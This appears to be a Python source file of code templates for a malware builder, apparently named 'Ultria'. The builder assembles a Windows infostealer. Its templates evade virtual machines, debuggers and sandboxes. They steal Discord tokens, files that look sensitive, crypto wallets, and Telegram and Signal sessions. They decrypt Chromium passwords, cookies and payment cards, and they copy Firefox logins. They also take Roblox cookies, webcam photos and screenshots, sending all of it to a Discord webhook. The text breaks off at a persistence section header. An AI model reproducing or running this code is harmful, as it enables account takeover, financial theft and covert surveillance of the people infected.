# VirusBuilderOptions — code templates injected into the generated payload.
# Each variable is a Python source-code string written verbatim into the output file.
# Placeholders (%KEY%, %WEBHOOK_URL%, etc.) are .replace()'d by the builder before writing.

# ─────────────────────────────────────────────────────────────────────────────
#  OBLIGATORY  — must be written first; decrypts webhook and defines helpers
# ─────────────────────────────────────────────────────────────────────────────
Obligatory = r"""
import base64, os, sys, platform, subprocess, threading, time, re, json, ctypes, shutil, socket
try:
    import requests as _v4r_req
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives import padding as _v4r_cpad
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
except Exception: pass

def _v4r_dec(enc_b64, key_str):
    try:
        data = base64.b64decode(enc_b64)
        salt, iv, ct = data[:16], data[16:32], data[32:]
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt,
                         iterations=100000, backend=default_backend())
        dk = kdf.derive(key_str.encode() if isinstance(key_str, str) else key_str)
        c = Cipher(algorithms.AES(dk), modes.CBC(iv), backend=default_backend()).decryptor()
        padded = c.update(ct) + c.finalize()
        up = _v4r_cpad.PKCS7(128).unpadder()
        return (up.update(padded) + up.finalize()).decode()
    except Exception: return ""

_v4r_key     = "%KEY%"
_v4r_wh_enc  = "%WEBHOOK_URL%"
try:    _v4r_webhook = _v4r_dec(_v4r_wh_enc, _v4r_key)
except: _v4r_webhook = ""
_v4r_avatar   = "%LINK_AVATAR%"
_v4r_skip_steal = False

def _v4r_post(title, body, color=0xa80505):
    try:
        _v4r_req.post(
            _v4r_webhook,
            json={"embeds": [{"title": str(title)[:256],
                              "description": str(body)[:4000],
                              "color": color}],
                  "username": "Ultria",
                  "avatar_url": _v4r_avatar},
            timeout=8
        )
    except Exception: pass

"""

# ─────────────────────────────────────────────────────────────────────────────
#  ANTI-VM / ANTI-DEBUG
# ─────────────────────────────────────────────────────────────────────────────
Ant1VM4ndD3bug = r"""
try:
    import ctypes as _v4r_ct, platform as _v4r_plat, os as _v4r_os, sys as _v4r_sys, time as _v4r_tm
    def _v4r_check_vm():
        _bad = ["vmware","virtualbox","vbox","qemu","bochs","xen","parallels",
                "hyper-v","hyperv","vmtoolsd","vmsrvc","vmusrvc"]
        try:
            import subprocess as _sp
            out = _sp.check_output(["wmic","computersystem","get","model"],
                                   stderr=_sp.DEVNULL,
                                   creationflags=_sp.CREATE_NO_WINDOW).decode("utf-8","ignore").lower()
            if any(x in out for x in _bad): return True
        except Exception: pass
        try:
            import winreg as _wr
            k = _wr.OpenKey(_wr.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Disk\Enum")
            v, _ = _wr.QueryValueEx(k, "0")
            if any(x in v.lower() for x in _bad): return True
        except Exception: pass
        return False
    def _v4r_check_debug():
        try:
            if _v4r_ct.windll.kernel32.IsDebuggerPresent(): return True
        except Exception: pass
        return False
    def _v4r_check_sandbox():
        try:
            if _v4r_plat.node().lower() in ("desktop","sandbox","maltest","analysis","win7","malware"):
                return True
        except Exception: pass
        try:
            import psutil as _pu
            if _pu.cpu_count() < 2: return True
            mem = _pu.virtual_memory().total / (1024**3)
            if mem < 1.5: return True
        except Exception: pass
        return False
    if _v4r_check_vm() or _v4r_check_debug() or _v4r_check_sandbox():
        _v4r_sys.exit(0)
except Exception: pass
"""

# ─────────────────────────────────────────────────────────────────────────────
#  SYSTEM INFO
# ─────────────────────────────────────────────────────────────────────────────
Sy5t3mInf0 = r"""
try:
    import platform as _v4r_p, os as _v4r_o, socket as _v4r_sk, ctypes as _v4r_c
    import subprocess as _v4r_sp
    def _v4r_sysinfo():
        try:
            _hn  = _v4r_sk.gethostname()
            _ip4 = _v4r_sk.gethostbyname(_hn)
        except Exception: _hn = _ip4 = "?"
        try:
            _eip = _v4r_req.get("https://api.ipify.org", timeout=4).text.strip()
        except Exception: _eip = "?"
        _user = _v4r_o.environ.get("USERNAME","?")
        _sys  = f"{_v4r_p.system()} {_v4r_p.release()} ({_v4r_p.version()[:40]})"
        _cpu  = _v4r_p.processor()[:60]
        try:
            import psutil as _pu
            _ram = f"{_pu.virtual_memory().total/(1024**3):.1f} GB"
        except Exception: _ram = "?"
        try:
            _admin = bool(_v4r_c.windll.shell32.IsUserAnAdmin())
        except Exception: _admin = False
        _body = (
            f"**Host:** `{_hn}` | **User:** `{_user}`\n"
            f"**LAN IP:** `{_ip4}` | **WAN IP:** `{_eip}`\n"
            f"**OS:** `{_sys}`\n"
            f"**CPU:** `{_cpu}`\n"
            f"**RAM:** `{_ram}`\n"
            f"**Admin:** `{_admin}`"
        )
        _v4r_post("System Info", _body, color=0x2b9efa)
    _v4r_sysinfo()
except Exception: pass
"""

# ─────────────────────────────────────────────────────────────────────────────
#  DISCORD TOKEN STEALER
# ─────────────────────────────────────────────────────────────────────────────
Di5c0rdAccount = r"""
try:
    import os as _v4r_do, re as _v4r_dr
    def _v4r_discord_tokens():
        _LAPP = _v4r_do.environ.get("LOCALAPPDATA", "")
        _RAPP = _v4r_do.environ.get("APPDATA", "")
        # Discord app paths
        _paths = {
            "Discord":         _v4r_do.path.join(_RAPP, "discord",        "Local Storage", "leveldb"),
            "Discord PTB":     _v4r_do.path.join(_RAPP, "discordptb",     "Local Storage", "leveldb"),
            "Discord Canary":  _v4r_do.path.join(_RAPP, "discordcanary",  "Local Storage", "leveldb"),
            "Discord Dev":     _v4r_do.path.join(_RAPP, "discorddevelopment", "Local Storage", "leveldb"),
        }
        # All Chromium browser profiles
        _br_ud = [
            ("Chrome",         _v4r_do.path.join(_LAPP, "Google",         "Chrome",         "User Data")),
            ("Chrome Beta",    _v4r_do.path.join(_LAPP, "Google",         "Chrome Beta",    "User Data")),
            ("Edge",           _v4r_do.path.join(_LAPP, "Microsoft",      "Edge",           "User Data")),
            ("Brave",          _v4r_do.path.join(_LAPP, "BraveSoftware",  "Brave-Browser",  "User Data")),
            ("Opera",          _v4r_do.path.join(_RAPP, "Opera Software", "Opera Stable")),
            ("Opera GX",       _v4r_do.path.join(_RAPP, "Opera Software", "Opera GX Stable")),
            ("Vivaldi",        _v4r_do.path.join(_LAPP, "Vivaldi",        "User Data")),
            ("Yandex",         _v4r_do.path.join(_LAPP, "Yandex",        "YandexBrowser",  "User Data")),
            ("Chromium",       _v4r_do.path.join(_LAPP, "Chromium",       "User Data")),
        ]
        _profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
        for _bn, _ud in _br_ud:
            if not _v4r_do.path.isdir(_ud): continue
            for _prof in _profiles:
                _ldb = _v4r_do.path.join(_ud, _prof, "Local Storage", "leveldb")
                if _v4r_do.path.isdir(_ldb):
                    _paths[f"{_bn}/{_prof}"] = _ldb
        _found = []
        _seen  = set()
        _rgx   = _v4r_dr.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84}")
        for _app, _path in _paths.items():
            if not _v4r_do.path.isdir(_path): continue
            try:
                for _fn in _v4r_do.listdir(_path):
                    if not _fn.endswith((".ldb", ".log")): continue
                    try:
                        with open(_v4r_do.path.join(_path, _fn), errors="ignore") as _f:
                            for _tok in _rgx.findall(_f.read()):
                                if _tok not in _seen:
                                    _seen.add(_tok)
                                    _found.append(f"{_app}: {_tok}")
                    except Exception: pass
            except Exception: pass
        if _found:
            _v4r_post("Discord Tokens", "```\n" + "\n".join(_found[:40]) + "\n```", color=0x5865f2)
    _v4r_discord_tokens()
except Exception: pass
"""

# ─────────────────────────────────────────────────────────────────────────────
#  DISCORD INJECTION  (disabled in preset — empty stub)
# ─────────────────────────────────────────────────────────────────────────────
Di5c0rdIj3ct10n = ""

# ─────────────────────────────────────────────────────────────────────────────
#  INTERESTING FILES
# ─────────────────────────────────────────────────────────────────────────────
Int3r3stingFil3s = r"""
try:
    import os as _v4r_if_os, zipfile as _v4r_if_zf, io as _v4r_if_io, requests as _v4r_if_rq
    def _v4r_interesting():
        _ext  = {".txt",".pdf",".doc",".docx",".xls",".xlsx",".key",".pem",
                 ".ppk",".kdbx",".ovpn",".conf",".cfg",".json",".env"}
        _kw   = ["password","passwd","secret","apikey","api_key","token","login",
                 "credentials","wallet","seed","mnemonic","private"]
        _hits = []
        _base = _v4r_if_os.path.expanduser("~")
        for _root, _, _files in _v4r_if_os.walk(_base):
            if len(_hits) >= 20: break
            if any(x in _root.lower() for x in ["appdata","cache",".git","node_modules"]): continue
            for _fn in _files:
                if len(_hits) >= 20: break
                _ext_ok = _v4r_if_os.path.splitext(_fn)[1].lower() in _ext
                _kw_ok  = any(k in _fn.lower() for k in _kw)
                if _ext_ok or _kw_ok:
                    _fp = _v4r_if_os.path.join(_root, _fn)
                    try:
                        if _v4r_if_os.path.getsize(_fp) < 5 * 1024 * 1024:
                            _hits.append(_fp)
                    except Exception: pass
        if not _hits: return
        _buf = _v4r_if_io.BytesIO()
        with _v4r_if_zf.ZipFile(_buf, "w", _v4r_if_zf.ZIP_DEFLATED) as _zf:
            for _fp in _hits:
                try: _zf.write(_fp, _v4r_if_os.path.basename(_fp))
                except Exception: pass
        _buf.seek(0)
        try:
            _v4r_if_rq.post(_v4r_webhook, files={"file": ("interesting_files.zip", _buf, "application/zip")},
                            data={"payload_json": '{"username":"Ultria"}'}, timeout=15)
        except Exception: pass
    _v4r_interesting()
except Exception: pass
"""

# ─────────────────────────────────────────────────────────────────────────────
#  SESSION FILES  (Wallets / Game Launchers / Apps)
# ─────────────────────────────────────────────────────────────────────────────
S3ssi0nFil3s = r"""
try:
    import os as _v4r_sf_os, zipfile as _v4r_sf_zf, io as _v4r_sf_io, requests as _v4r_sf_rq, shutil as _v4r_sf_sh
    _v4r_sf_choice = ["%SESSION_FILES_CHOICE%"]
    _v4r_sf_targets = {
        "Wallets": [
            os.path.join(os.environ.get("APPDATA",""), "Exodus"),
            os.path.join(os.environ.get("APPDATA",""), "Electrum", "wallets"),
            os.path.join(os.environ.get("APPDATA",""), "Ethereum", "keystore"),
            os.path.join(os.environ.get("APPDATA",""), "Atomic", "Local Storage"),
            os.path.join(os.environ.get("LOCALAPPDATA",""), "Coinomi", "Coinomi", "wallets"),
        ],
        "Game Launchers": [
            os.path.join(os.environ.get("LOCALAPPDATA",""), "Steam", "htmlcache"),
            os.path.join(os.environ.get("APPDATA",""), "Riot Games"),
            os.path.join(os.environ.get("LOCALAPPDATA",""), "EpicGamesLauncher", "Saved", "Config"),
        ],
        "Apps": [
            os.path.join(os.environ.get("APPDATA",""), "Telegram Desktop", "tdata"),
            os.path.join(os.environ.get("APPDATA",""), "Signal", "Local Storage"),
        ],
    }
    def _v4r_steal_sessions():
        _buf = _v4r_sf_io.BytesIO()
        _added = 0
        with _v4r_sf_zf.ZipFile(_buf, "w", _v4r_sf_zf.ZIP_DEFLATED) as _zf:
            for _cat in _v4r_sf_choice:
                for _src in _v4r_sf_targets.get(_cat, []):
                    if not _v4r_sf_os.path.exists(_src): continue
                    if _v4r_sf_os.path.isfile(_src):
                        try: _zf.write(_src, _v4r_sf_os.path.basename(_src)); _added += 1
                        except Exception: pass
                    else:
                        for _root, _, _fls in _v4r_sf_os.walk(_src):
                            for _fn in _fls[:50]:
                                try:
                                    _fp = _v4r_sf_os.path.join(_root, _fn)
                                    if _v4r_sf_os.path.getsize(_fp) < 10*1024*1024:
                                        _zf.write(_fp, _v4r_sf_os.path.relpath(_fp, _v4r_sf_os.path.dirname(_src)))
                                        _added += 1
                                except Exception: pass
        if _added:
            _buf.seek(0)
            try:
                _v4r_sf_rq.post(_v4r_webhook, files={"file":("session_files.zip",_buf,"application/zip")},
                                data={"payload_json":'{"username":"Ultria"}'}, timeout=15)
            except Exception: pass
    _v4r_steal_sessions()
except Exception: pass
"""

# ─────────────────────────────────────────────────────────────────────────────
#  BROWSER STEALER  (passwords, cookies, history, etc.)
# ─────────────────────────────────────────────────────────────────────────────
Br0w53r5t341 = r"""
try:
    import os as _v4r_br_os, json as _v4r_br_j, shutil as _v4r_br_sh
    import base64 as _v4r_br_b64, sqlite3 as _v4r_br_sql, requests as _v4r_br_rq
    import zipfile as _v4r_br_zf, io as _v4r_br_io, ctypes as _v4r_br_ct

    _v4r_br_choice = ["%BROWSER_CHOICE%"]
    _LAPP = _v4r_br_os.environ.get("LOCALAPPDATA", "")
    _RAPP = _v4r_br_os.environ.get("APPDATA", "")

    # ── 25+ Chromium-based browsers ──────────────────────────────────────────
    _v4r_chromium_browsers = [
        ("Chrome",           _v4r_br_os.path.join(_LAPP, "Google",          "Chrome",             "User Data")),
        ("Chrome Beta",      _v4r_br_os.path.join(_LAPP, "Google",          "Chrome Beta",        "User Data")),
        ("Chrome Dev",       _v4r_br_os.path.join(_LAPP, "Google",          "Chrome Dev",         "User Data")),
        ("Chrome Canary",    _v4r_br_os.path.join(_LAPP, "Google",          "Chrome SxS",         "User Data")),
        ("Edge",             _v4r_br_os.path.join(_LAPP, "Microsoft",       "Edge",               "User Data")),
        ("Edge Beta",        _v4r_br_os.path.join(_LAPP, "Microsoft",       "Edge Beta",          "User Data")),
        ("Edge Dev",         _v4r_br_os.path.join(_LAPP, "Microsoft",       "Edge Dev",           "User Data")),
        ("Brave",            _v4r_br_os.path.join(_LAPP, "BraveSoftware",   "Brave-Browser",      "User Data")),
        ("Brave Beta",       _v4r_br_os.path.join(_LAPP, "BraveSoftware",   "Brave-Browser-Beta", "User Data")),
        ("Opera",            _v4r_br_os.path.join(_RAPP, "Opera Software",  "Opera Stable")),
        ("Opera GX",         _v4r_br_os.path.join(_RAPP, "Opera Software",  "Opera GX Stable")),
        ("Opera Crypto",     _v4r_br_os.path.join(_RAPP, "Opera Software",  "Opera Crypto Stable")),
        ("Vivaldi",          _v4r_br_os.path.join(_LAPP, "Vivaldi",         "User Data")),
        ("Yandex",           _v4r_br_os.path.join(_LAPP, "Yandex",          "YandexBrowser",      "User Data")),
        ("Chromium",         _v4r_br_os.path.join(_LAPP, "Chromium",        "User Data")),
        ("CentBrowser",      _v4r_br_os.path.join(_LAPP, "CentBrowser",     "User Data")),
        ("Torch",            _v4r_br_os.path.join(_LAPP, "Torch",           "User Data")),
        ("Comodo Dragon",    _v4r_br_os.path.join(_LAPP, "Comodo",          "Dragon",             "User Data")),
        ("Slimjet",          _v4r_br_os.path.join(_LAPP, "Slimjet",         "User Data")),
        ("Epic Privacy",     _v4r_br_os.path.join(_LAPP, "Epic Privacy Browser", "User Data")),
        ("Coc Coc",          _v4r_br_os.path.join(_LAPP, "CocCoc",          "Browser",            "User Data")),
        ("Iridium",          _v4r_br_os.path.join(_LAPP, "Iridium",         "User Data")),
        ("Avast Browser",    _v4r_br_os.path.join(_LAPP, "AVAST Software",  "Browser",            "User Data")),
        ("CCleaner Browser", _v4r_br_os.path.join(_LAPP, "CCleaner Browser","User Data")),
        ("7Star",            _v4r_br_os.path.join(_LAPP, "7Star",           "7Star",              "User Data")),
        ("360Browser",       _v4r_br_os.path.join(_LAPP, "360Chrome",       "Chrome",             "User Data")),
        ("SRWare Iron",      _v4r_br_os.path.join(_LAPP, "SRWare Iron",     "User Data")),
        ("Maxthon",          _v4r_br_os.path.join(_LAPP, "Maxthon",         "Application",        "User Data")),
    ]

    # ── Firefox-family browsers ───────────────────────────────────────────────
    _v4r_firefox_roots = [
        ("Firefox",   _v4r_br_os.path.join(_RAPP, "Mozilla",   "Firefox",  "Profiles")),
        ("LibreWolf", _v4r_br_os.path.join(_RAPP, "LibreWolf", "Profiles")),
        ("Waterfox",  _v4r_br_os.path.join(_RAPP, "Waterfox",  "Profiles")),
        ("PaleMoon",  _v4r_br_os.path.join(_RAPP, "Moonchild Productions", "Pale Moon", "Profiles")),
        ("Basilisk",  _v4r_br_os.path.join(_RAPP, "Moonchild Productions", "Basilisk",  "Profiles")),
        ("Thunderbird",_v4r_br_os.path.join(_RAPP, "Thunderbird", "Profiles")),
    ]

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _v4r_dpapi(data):
        try:
            class _DA(_v4r_br_ct.Structure):
                _fields_ = [("cbData", _v4r_br_ct.c_ulong), ("pbData", _v4r_br_ct.c_char_p)]
            _i = _DA(len(data), data); _o = _DA()
            if _v4r_br_ct.windll.crypt32.CryptUnprotectData(
                    _v4r_br_ct.byref(_i), None, None, None, None, 0, _v4r_br_ct.byref(_o)):
                return _v4r_br_ct.string_at(_o.pbData, _o.cbData)
        except Exception: pass
        return b""

    def _v4r_get_key(ud_path):
        try:
            with open(_v4r_br_os.path.join(ud_path, "Local State"), encoding="utf-8", errors="ignore") as _f:
                ls = _v4r_br_j.load(_f)
            ek = _v4r_br_b64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
            return _v4r_dpapi(ek)
        except Exception: return None

    def _v4r_dec(enc, key):
        if not enc: return ""
        try:
            if enc[:3] in (b"v10", b"v11"):
                from Crypto.Cipher import AES as _A
                enc = enc[3:]; iv = enc[:12]; pay = enc[12:]
                c = _A.new(key, _A.MODE_GCM, iv)
                return c.decrypt_and_verify(pay[:-16], pay[-16:]).decode(errors="ignore")
        except Exception: pass
        try: return _v4r_dpapi(enc).decode(errors="ignore")
        except Exception: return ""

    def _v4r_profiles(ud):
        cands = ["Default"] + [f"Profile {i}" for i in range(1, 25)]
        try:
            with open(_v4r_br_os.path.join(ud, "Local State"), encoding="utf-8", errors="ignore") as _f:
                ls = _v4r_br_j.load(_f)
            cands = list(ls.get("profile", {}).get("info_cache", {}).keys()) + cands
        except Exception: pass
        return [p for p in dict.fromkeys(cands) if _v4r_br_os.path.isdir(_v4r_br_os.path.join(ud, p))]

    def _v4r_tmp_copy(src):
        dst = src + "_v4r"
        try: _v4r_br_sh.copy2(src, dst); return dst
        except Exception: return None

    # ── Main stealer ──────────────────────────────────────────────────────────
    def _v4r_steal_browsers():
        _passwd_lines = []
        _buf = _v4r_br_io.BytesIO()
        with _v4r_br_zf.ZipFile(_buf, "w", _v4r_br_zf.ZIP_DEFLATED) as _zf:

            # ── CHROMIUM BROWSERS ─────────────────────────────────────────────
            for _bname, _ud in _v4r_chromium_browsers:
                if not _v4r_br_os.path.isdir(_ud): continue
                _key = _v4r_get_key(_ud)
                for _prof in _v4r_profiles(_ud):
                    _pd  = _v4r_br_os.path.join(_ud, _prof)
                    _tag = f"{_bname}|{_prof}"

                    # Passwords
                    if "passwords" in _v4r_br_choice:
                        _db = _v4r_br_os.path.join(_pd, "Login Data")
                        if _v4r_br_os.path.isfile(_db):
                            _t = _v4r_tmp_copy(_db)
                            if _t:
                                try:
                                    _c = _v4r_br_sql.connect(_t)
                                    for _r in _c.execute(
                                        "SELECT origin_url,action_url,username_value,password_value FROM logins"
                                    ):
                                        if not _r[2] and not _r[3]: continue
                                        _pw = _v4r_dec(_r[3], _key)
                                        _passwd_lines.append(
                                            f"[{_tag}]\nURL: {_r[0]}\nSubmit: {_r[1]}\nUser: {_r[2]}\nPass: {_pw}\n"
                                        )
                                    _c.close()
                                except Exception: pass
                                try: _v4r_br_os.remove(_t)
                                except Exception: pass

                    # Cookies (Netscape format — importable)
                    if "cookies" in _v4r_br_choice:
                        for _cp in [
                            _v4r_br_os.path.join(_pd, "Network", "Cookies"),
                            _v4r_br_os.path.join(_pd, "Cookies"),
                        ]:
                            if not _v4r_br_os.path.isfile(_cp): continue
                            _t = _v4r_tmp_copy(_cp)
                            if _t:
                                try:
                                    _c = _v4r_br_sql.connect(_t)
                                    _ck = ["# Netscape HTTP Cookie File"]
                                    for _r in _c.execute(
                                        "SELECT host_key,name,encrypted_value,path,expires_utc,is_secure,is_httponly FROM cookies ORDER BY host_key"
                                    ):
                                        _v = _v4r_dec(_r[2], _key)
                                        _exp = str(max(0, int(_r[4] / 1000000 - 11644473600))) if _r[4] else "0"
                                        _ck.append(
                                            f"{_r[0]}\t{'TRUE' if _r[0].startswith('.') else 'FALSE'}\t{_r[3]}\t{'TRUE' if _r[5] else 'FALSE'}\t{_exp}\t{_r[1]}\t{_v}"
                                        )
                                    _c.close()
                                    if len(_ck) > 1:
                                        _zf.writestr(f"{_bname}_{_prof}_cookies.txt", "\n".join(_ck))
                                except Exception: pass
                                try: _v4r_br_os.remove(_t)
                                except Exception: pass
                            break

                    # History + visit count + title
                    if "history" in _v4r_br_choice:
                        _db = _v4r_br_os.path.join(_pd, "History")
                        if _v4r_br_os.path.isfile(_db):
                            _t = _v4r_tmp_copy(_db)
                            if _t:
                                try:
                                    _c = _v4r_br_sql.connect(_t)
                                    _h = [
                                        f"{_r[2]}x | {_r[1] or '(no title)'} | {_r[0]}"
                                        for _r in _c.execute(
                                            "SELECT url,title,visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 500"
                                        )
                                    ]
                                    _c.close()
                                    if _h: _zf.writestr(f"{_bname}_{_prof}_history.txt", "\n".join(_h))
                                except Exception: pass
                                try: _v4r_br_os.remove(_t)
                                except Exception: pass

                    # Downloads
                    if "downloads" in _v4r_br_choice:
                        _db = _v4r_br_os.path.join(_pd, "History")
                        if _v4r_br_os.path.isfile(_db):
                            _t = _v4r_tmp_copy(_db + "_dl")
                            if not _t: _t = _v4r_tmp_copy(_db)
                            if _t:
                                try:
                                    _c = _v4r_br_sql.connect(_t)
                                    _dl = [
                                        f"{_r[2]} bytes | {_r[1]} <- {_r[0]}"
                                        for _r in _c.execute(
                                            "SELECT tab_url,target_path,total_bytes FROM downloads ORDER BY start_time DESC LIMIT 300"
                                        )
                                    ]
                                    _c.close()
                                    if _dl: _zf.writestr(f"{_bname}_{_prof}_downloads.txt", "\n".join(_dl))
                                except Exception: pass
                                try: _v4r_br_os.remove(_t)
                                except Exception: pass

                    # Cards
                    if "cards" in _v4r_br_choice:
                        _db = _v4r_br_os.path.join(_pd, "Web Data")
                        if _v4r_br_os.path.isfile(_db):
                            _t = _v4r_tmp_copy(_db)
                            if _t:
                                try:
                                    _c = _v4r_br_sql.connect(_t)
                                    _cards = []
                                    for _r in _c.execute(
                                        "SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards"
                                    ):
                                        _num = _v4r_dec(_r[3], _key)
                                        _cards.append(f"[{_tag}] {_r[0]} | {_r[1]}/{_r[2]} | {_num}")
                                    _c.close()
                                    if _cards: _zf.writestr(f"{_bname}_{_prof}_cards.txt", "\n".join(_cards))
                                except Exception: pass
                                try: _v4r_br_os.remove(_t)
                                except Exception: pass

                    # Extensions (name + id + version)
                    if "extentions" in _v4r_br_choice:
                        _ext_d = _v4r_br_os.path.join(_pd, "Extensions")
                        if _v4r_br_os.path.isdir(_ext_d):
                            try:
                                _exts = []
                                for _eid in _v4r_br_os.listdir(_ext_d):
                                    try:
                                        _ev = sorted(_v4r_br_os.listdir(_v4r_br_os.path.join(_ext_d, _eid)))[-1]
                                        _mf = _v4r_br_os.path.join(_ext_d, _eid, _ev, "manifest.json")
                                        if _v4r_br_os.path.isfile(_mf):
                                            with open(_mf, encoding="utf-8", errors="ignore") as _mff:
                                                _md = _v4r_br_j.load(_mff)
                                            _exts.append(f"{_eid}  {_md.get('name','?')}  v{_md.get('version','?')}")
                                    except Exception: pass
                                if _exts:
                                    _zf.writestr(f"{_bname}_{_prof}_extensions.txt", "\n".join(_exts))
                            except Exception: pass

            # ── FIREFOX-FAMILY BROWSERS ───────────────────────────────────────
            for _ff_name, _ff_root in _v4r_firefox_roots:
                if not _v4r_br_os.path.isdir(_ff_root): continue
                try:
                    for _prof in _v4r_br_os.listdir(_ff_root):
                        _pd = _v4r_br_os.path.join(_ff_root, _prof)
                        if not _v4r_br_os.path.isdir(_pd): continue
                        _tag = f"{_ff_name}|{_prof}"

                        # Passwords (logins.json — still encrypted with NSS, save raw)
                        if "passwords" in _v4r_br_choice:
                            _lp = _v4r_br_os.path.join(_pd, "logins.json")
                            if _v4r_br_os.path.isfile(_lp):
                                try:
                                    with open(_lp, encoding="utf-8", errors="ignore") as _f:
                                        _lj = _v4r_br_j.load(_f)
                                    for _ln in _lj.get("logins", []):
                                        _passwd_lines.append(
                                            f"[{_tag}]\nURL: {_ln.get('hostname','')}\n"
                                            f"EncUser: {_ln.get('encryptedUsername','')}\n"
                                            f"EncPass: {_ln.get('encryptedPassword','')}\n"
                                        )
                                except Exception: pass

                        # Cookies (Netscape format)
                        if "cookies" in _v4r_br_choice:
                            _cp = _v4r_br_os.path.join(_pd, "cookies.sqlite")
                            if _v4r_br_os.path.isfile(_cp):
                                _t = _v4r_tmp_copy(_cp)
                                if _t:
                                    try:
                                        _c = _v4r_br_sql.connect(_t)
                                        _ck = ["# Netscape HTTP Cookie File"]
                                        for _r in _c.execute(
                                            "SELECT host, name, value, path, expiry, isSecure FROM moz_cookies ORDER BY host"
                                        ):
                                            _ck.append(
                                                f"{_r[0]}\t{'TRUE' if _r[0].startswith('.') else 'FALSE'}\t{_r[3]}\t{'TRUE' if _r[5] else 'FALSE'}\t{_r[4]}\t{_r[1]}\t{_r[2]}"
                                            )
                                        _c.close()
                                        if len(_ck) > 1:
                                            _zf.writestr(f"{_ff_name}_{_prof}_cookies.txt", "\n".join(_ck))
                                    except Exception: pass
                                    try: _v4r_br_os.remove(_t)
                                    except Exception: pass

                        # History
                        if "history" in _v4r_br_choice:
                            _hp = _v4r_br_os.path.join(_pd, "places.sqlite")
                            if _v4r_br_os.path.isfile(_hp):
                                _t = _v4r_tmp_copy(_hp)
                                if _t:
                                    try:
                                        _c = _v4r_br_sql.connect(_t)
                                        _h = [
                                            f"{_r[2]}x | {_r[1] or '(no title)'} | {_r[0]}"
                                            for _r in _c.execute(
                                                "SELECT url,title,visit_count FROM moz_places WHERE visit_count>0 ORDER BY last_visit_date DESC LIMIT 500"
                                            )
                                        ]
                                        _c.close()
                                        if _h: _zf.writestr(f"{_ff_name}_{_prof}_history.txt", "\n".join(_h))
                                    except Exception: pass
                                    try: _v4r_br_os.remove(_t)
                                    except Exception: pass

                        # Downloads
                        if "downloads" in _v4r_br_choice:
                            _hp = _v4r_br_os.path.join(_pd, "places.sqlite")
                            if _v4r_br_os.path.isfile(_hp):
                                _t = _v4r_br_os.path.join(_pd, "places_dl_v4r.sqlite")
                                try: _v4r_br_sh.copy2(_hp, _t)
                                except Exception: _t = None
                                if _t:
                                    try:
                                        _c = _v4r_br_sql.connect(_t)
                                        _dl = [
                                            f"{_r[1]}"
                                            for _r in _c.execute(
                                                "SELECT place_id,content FROM moz_annos WHERE anno_attribute_id IN (SELECT id FROM moz_anno_attributes WHERE name='downloads/metaData') ORDER BY dateAdded DESC LIMIT 200"
                                            )
                                        ]
                                        _c.close()
                                        if _dl: _zf.writestr(f"{_ff_name}_{_prof}_downloads.txt", "\n".join(_dl))
                                    except Exception: pass
                                    try: _v4r_br_os.remove(_t)
                                    except Exception: pass
                except Exception: pass

        # ── Send ──────────────────────────────────────────────────────────────
        if _passwd_lines:
            _v4r_post(
                "Browser Passwords",
                "```\n" + "\n".join(_passwd_lines[:40])[:3900] + "\n```",
                color=0xffa500
            )
        _buf.seek(0)
        if _buf.getbuffer().nbytes > 22:
            try:
                _v4r_br_rq.post(
                    _v4r_webhook,
                    files={"file": ("browser_data.zip", _buf, "application/zip")},
                    data={"payload_json": '{"username":"Ultria"}'},
                    timeout=20
                )
            except Exception: pass

    _v4r_steal_browsers()
except Exception: pass
"""

# ─────────────────────────────────────────────────────────────────────────────
#  ROBLOX
# ─────────────────────────────────────────────────────────────────────────────
R0b10xAccount = r"""
try:
    import os as _v4r_rb_os, re as _v4r_rb_re
    def _v4r_roblox():
        _cookie = None
        _base = _v4r_rb_os.path.join(_v4r_rb_os.environ.get("LOCALAPPDATA",""), "Roblox", "LocalStorage")
        if _v4r_rb_os.path.isdir(_base):
            for _fn in _v4r_rb_os.listdir(_base):
                try:
                    with open(_v4r_rb_os.path.join(_base, _fn), errors="ignore") as _f:
                        _m = _v4r_rb_re.search(r"\.ROBLOSECURITY[^;\"']{0,5}([A-Za-z0-9_\-]+)", _f.read())
                        if _m: _cookie = _m.group(1); break
                except Exception: pass
        if _cookie:
            _v4r_post("Roblox", f"`.ROBLOSECURITY` cookie found:\n```\n{_cookie[:200]}\n```", color=0xe8423a)
    _v4r_roblox()
except Exception: pass
"""

# ─────────────────────────────────────────────────────────────────────────────
#  WEBCAM
# ─────────────────────────────────────────────────────────────────────────────
W3bc4m = r"""
try:
    import io as _v4r_wc_io, requests as _v4r_wc_rq
    import cv2 as _v4r_cv
    def _v4r_webcam():
        cap = _v4r_cv.VideoCapture(0)
        if not cap.isOpened(): return
        cap.set(_v4r_cv.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(_v4r_cv.CAP_PROP_FRAME_HEIGHT, 480)
        import time as _vwt; _vwt.sleep(0.3)
        ret, frame = cap.read()
        cap.release()
        if not ret: return
        _, buf = _v4r_cv.imencode(".jpg", frame, [_v4r_cv.IMWRITE_JPEG_QUALITY, 70])
        _v4r_wc_rq.post(_v4r_webhook, files={"file":("webcam.jpg", buf.tobytes(), "image/jpeg")},
                        data={"payload_json":'{"username":"Ultria"}'}, timeout=10)
    _v4r_webcam()
except Exception: pass
"""

# ─────────────────────────────────────────────────────────────────────────────
#  SCREENSHOT
# ─────────────────────────────────────────────────────────────────────────────
Scr33n5h0t = r"""
try:
    import io as _v4r_sc_io, requests as _v4r_sc_rq
    from PIL import ImageGrab as _v4r_ig
    def _v4r_screenshot():
        img = _v4r_ig.grab()
        _buf = _v4r_sc_io.BytesIO()
        img.save(_buf, format="PNG")
        _buf.seek(0)
        _v4r_sc_rq.post(_v4r_webhook, files={"file":("screenshot.png",_buf,"image/png")},
                        data={"payload_json":'{"username":"Ultria"}'}, timeout=10)
    _v4r_screenshot()
except Exception: pass
"""

# ─────────────────────────────────────────────────────────────────────────────
#  STARTUP PERSISTENCE
